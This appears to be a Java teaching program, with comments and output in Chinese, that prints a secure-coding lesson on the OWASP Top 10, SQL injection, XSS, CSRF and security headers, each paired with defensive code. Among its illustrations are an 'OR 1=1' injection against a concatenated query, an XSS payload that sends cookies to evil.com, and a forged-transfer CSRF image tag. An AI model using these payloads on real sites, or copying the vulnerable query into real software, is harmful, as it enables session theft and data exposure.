package phase19;

/**
 * Phase 19: 安全编码实践
 * 
 * 本课程涵盖：
 * 1. OWASP Top 10 漏洞
 * 2. 常见攻击与防御
 * 3. 安全编码规范
 * 4. 安全测试
 */
public class SecureCoding {

    public static void main(String[] args) {
        System.out.println("╔══════════════════════════════════════════════════════════════╗");
        System.out.println("║          🔒 Phase 19: 安全编码实践                            ║");
        System.out.println("╚══════════════════════════════════════════════════════════════╝");

        owaspTop10();
        sqlInjection();
        xssAttack();
        csrfProtection();
        securityHeaders();
    }

    // ==================== 1. OWASP Top 10 ====================

    private static void owaspTop10() {
        System.out.println("\n📌 1. OWASP Top 10 (2021)\n");

        System.out.println("OWASP (Open Web Application Security Project) 十大安全风险：");
        System.out.println();
        System.out.println("┌────┬─────────────────────────────────────────────────────────┐");
        System.out.println("│ 序号│ 风险类型                          │ 说明               │");
        System.out.println("├────┼───────────────────────────────────┼────────────────────┤");
        System.out.println("│ A01│ Broken Access Control             │ 访问控制失效        │");
        System.out.println("│ A02│ Cryptographic Failures            │ 加密失效            │");
        System.out.println("│ A03│ Injection                         │ 注入攻击            │");
        System.out.println("│ A04│ Insecure Design                   │ 不安全设计          │");
        System.out.println("│ A05│ Security Misconfiguration         │ 安全配置错误        │");
        System.out.println("│ A06│ Vulnerable Components             │ 易受攻击的组件      │");
        System.out.println("│ A07│ Identification and Auth Failures  │ 身份认证失败        │");
        System.out.println("│ A08│ Software and Data Integrity       │ 软件和数据完整性    │");
        System.out.println("│ A09│ Security Logging and Monitoring   │ 安全日志和监控不足  │");
        System.out.println("│ A10│ Server-Side Request Forgery       │ 服务端请求伪造      │");
        System.out.println("└────┴───────────────────────────────────┴────────────────────┘");
    }

    // ==================== 2. SQL 注入 ====================

    private static void sqlInjection() {
        System.out.println("\n" + "─".repeat(60));
        System.out.println("\n📌 2. SQL 注入防御\n");

        System.out.println("┌─────────────────────────────────────────────────────────────┐");
        System.out.println("│ ❌ 危险代码（SQL 注入漏洞）                                  │");
        System.out.println("├─────────────────────────────────────────────────────────────┤");
        System.out.println("│ String query = \"SELECT * FROM users WHERE id = \" + userId; │");
        System.out.println("│ Statement stmt = connection.createStatement();              │");
        System.out.println("│ ResultSet rs = stmt.executeQuery(query);                    │");
        System.out.println("│                                                              │");
        System.out.println("│ 攻击者输入: 1 OR 1=1                                         │");
        System.out.println("│ 结果: SELECT * FROM users WHERE id = 1 OR 1=1  (返回所有用户)│");
        System.out.println("└─────────────────────────────────────────────────────────────┘");
        System.out.println();

        System.out.println("┌─────────────────────────────────────────────────────────────┐");
        System.out.println("│ ✅ 安全代码（预编译语句）                                    │");
        System.out.println("├─────────────────────────────────────────────────────────────┤");
        System.out.println("│ String query = \"SELECT * FROM users WHERE id = ?\";         │");
        System.out.println("│ PreparedStatement pstmt = connection.prepareStatement(query);│");
        System.out.println("│ pstmt.setLong(1, userId);  // 参数绑定                       │");
        System.out.println("│ ResultSet rs = pstmt.executeQuery();                         │");
        System.out.println("│                                                              │");
        System.out.println("│ 原理: 参数作为数据处理，不会被解析为 SQL 语句                │");
        System.out.println("└─────────────────────────────────────────────────────────────┘");
        System.out.println();

        System.out.println("其他防御措施：");
        System.out.println("  • 使用 ORM 框架（JPA、MyBatis）");
        System.out.println("  • 输入验证（白名单）");
        System.out.println("  • 最小权限数据库账户");
        System.out.println("  • WAF (Web Application Firewall)");
    }

    // ==================== 3. XSS 攻击 ====================

    private static void xssAttack() {
        System.out.println("\n" + "─".repeat(60));
        System.out.println("\n📌 3. XSS (跨站脚本攻击) 防御\n");

        System.out.println("XSS 攻击类型：");
        System.out.println();
        System.out.println("┌─────────────────────────────────────────────────────────────┐");
        System.out.println("│ 1. 存储型 XSS (Stored XSS)                                   │");
        System.out.println("├─────────────────────────────────────────────────────────────┤");
        System.out.println("│ 恶意脚本存储在服务器（如评论区）                             │");
        System.out.println("│ 攻击者提交: <script>document.location='http://evil.com?c='  │");
        System.out.println("│             +document.cookie</script>                        │");
        System.out.println("│ 其他用户访问页面时脚本执行 → Cookie 被盗                     │");
        System.out.println("└─────────────────────────────────────────────────────────────┘");
        System.out.println();

        System.out.println("┌─────────────────────────────────────────────────────────────┐");
        System.out.println("│ 2. 反射型 XSS (Reflected XSS)                                │");
        System.out.println("├─────────────────────────────────────────────────────────────┤");
        System.out.println("│ 恶意脚本在 URL 参数中，服务器返回时执行                      │");
        System.out.println("│ URL: /search?q=<script>alert('XSS')</script>                 │");
        System.out.println("└─────────────────────────────────────────────────────────────┘");
        System.out.println();

        System.out.println("防御措施：");
        System.out.println("```java");
        System.out.println("// 1. 输出编码（OWASP Java Encoder）");
        System.out.println("import org.owasp.encoder.Encode;");
        System.out.println();
        System.out.println("// HTML 上下文");
        System.out.println("String safe = Encode.forHtml(userInput);");
        System.out.println("// JavaScript 上下文");
        System.out.println("String safeJs = Encode.forJavaScript(userInput);");
        System.out.println("// URL 参数");
        System.out.println("String safeUrl = Encode.forUriComponent(userInput);");
        System.out.println();
        System.out.println("// 2. Content Security Policy (CSP)");
        System.out.println("response.setHeader(\"Content-Security-Policy\",");
        System.out.println("    \"default-src 'self'; script-src 'self'\");");
        System.out.println();
        System.out.println("// 3. HttpOnly Cookie（防止 JS 访问）");
        System.out.println("Cookie cookie = new Cookie(\"session\", sessionId);");
        System.out.println("cookie.setHttpOnly(true);");
        System.out.println("cookie.setSecure(true);");
        System.out.println("```");
    }

    // ==================== 4. CSRF 防护 ====================

    private static void csrfProtection() {
        System.out.println("\n" + "─".repeat(60));
        System.out.println("\n📌 4. CSRF (跨站请求伪造) 防护\n");

        System.out.println("┌─────────────────────────────────────────────────────────────┐");
        System.out.println("│ CSRF 攻击原理                                                │");
        System.out.println("├─────────────────────────────────────────────────────────────┤");
        System.out.println("│                                                              │");
        System.out.println("│  1. 用户登录银行网站 bank.com（Cookie 已存储）              │");
        System.out.println("│  2. 用户访问恶意网站 evil.com                               │");
        System.out.println("│  3. evil.com 包含:                                          │");
        System.out.println("│     <img src=\"https://bank.com/transfer?to=hacker&amount=1000\">│");
        System.out.println("│  4. 浏览器自动带上 bank.com 的 Cookie                       │");
        System.out.println("│  5. 转账请求成功执行                                        │");
        System.out.println("│                                                              │");
        System.out.println("└─────────────────────────────────────────────────────────────┘");
        System.out.println();

        System.out.println("防御措施：");
        System.out.println();
        System.out.println("```java");
        System.out.println("// 1. CSRF Token (Spring Security 默认启用)");
        System.out.println("@EnableWebSecurity");
        System.out.println("public class SecurityConfig {");
        System.out.println("    @Bean");
        System.out.println("    public SecurityFilterChain filterChain(HttpSecurity http) {");
        System.out.println("        http.csrf(csrf -> csrf");
        System.out.println("            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())");
        System.out.println("        );");
        System.out.println("        return http.build();");
        System.out.println("    }");
        System.out.println("}");
        System.out.println();
        System.out.println("// 前端表单需要包含 CSRF Token");
        System.out.println("// <input type=\"hidden\" name=\"_csrf\" value=\"${_csrf.token}\">");
        System.out.println();
        System.out.println("// 2. SameSite Cookie");
        System.out.println("Cookie cookie = new Cookie(\"session\", sessionId);");
        System.out.println("cookie.setAttribute(\"SameSite\", \"Strict\"); // 或 Lax");
        System.out.println();
        System.out.println("// 3. 检查 Referer/Origin 头");
        System.out.println("String origin = request.getHeader(\"Origin\");");
        System.out.println("if (!allowedOrigins.contains(origin)) {");
        System.out.println("    throw new SecurityException(\"Invalid origin\");");
        System.out.println("}");
        System.out.println("```");
    }

    // ==================== 5. 安全响应头 ====================

    private static void securityHeaders() {
        System.out.println("\n" + "─".repeat(60));
        System.out.println("\n📌 5. 安全响应头\n");

        System.out.println("┌─────────────────────────────────────────────────────────────┐");
        System.out.println("│ 必备安全响应头                                               │");
        System.out.println("├─────────────────────────────────────────────────────────────┤");
        System.out.println("│ Content-Security-Policy: default-src 'self'                 │");
        System.out.println("│   → 限制脚本/资源来源，防止 XSS                              │");
        System.out.println("│                                                              │");
        System.out.println("│ X-Content-Type-Options: nosniff                              │");
        System.out.println("│   → 防止 MIME 类型嗅探                                       │");
        System.out.println("│                                                              │");
        System.out.println("│ X-Frame-Options: DENY                                        │");
        System.out.println("│   → 防止点击劫持 (Clickjacking)                              │");
        System.out.println("│                                                              │");
        System.out.println("│ Strict-Transport-Security: max-age=31536000; includeSubDomains│");
        System.out.println("│   → 强制 HTTPS (HSTS)                                        │");
        System.out.println("│                                                              │");
        System.out.println("│ X-XSS-Protection: 1; mode=block                              │");
        System.out.println("│   → 浏览器 XSS 过滤器（已过时，CSP 替代）                    │");
        System.out.println("└─────────────────────────────────────────────────────────────┘");
        System.out.println();

        System.out.println("Spring Security 配置：");
        System.out.println("```java");
        System.out.println("@Bean");
        System.out.println("public SecurityFilterChain filterChain(HttpSecurity http) {");
        System.out.println("    http.headers(headers -> headers");
        System.out.println("        .contentSecurityPolicy(csp -> csp");
        System.out.println("            .policyDirectives(\"default-src 'self'\"))");
        System.out.println("        .frameOptions(frame -> frame.deny())");
        System.out.println("        .httpStrictTransportSecurity(hsts -> hsts");
        System.out.println("            .includeSubDomains(true)");
        System.out.println("            .maxAgeInSeconds(31536000))");
        System.out.println("    );");
        System.out.println("    return http.build();");
        System.out.println("}");
        System.out.println("```");
        System.out.println();

        System.out.println("💡 安全编码核心原则：");
        System.out.println("  1. 不信任用户输入 - 验证、清理、编码");
        System.out.println("  2. 使用安全 API - 预编译语句、加密库");
        System.out.println("  3. 最小权限原则 - 只授予必要权限");
        System.out.println("  4. 深度防御 - 多层安全措施");
        System.out.println("  5. 保持更新 - 及时修复已知漏洞");
    }
}
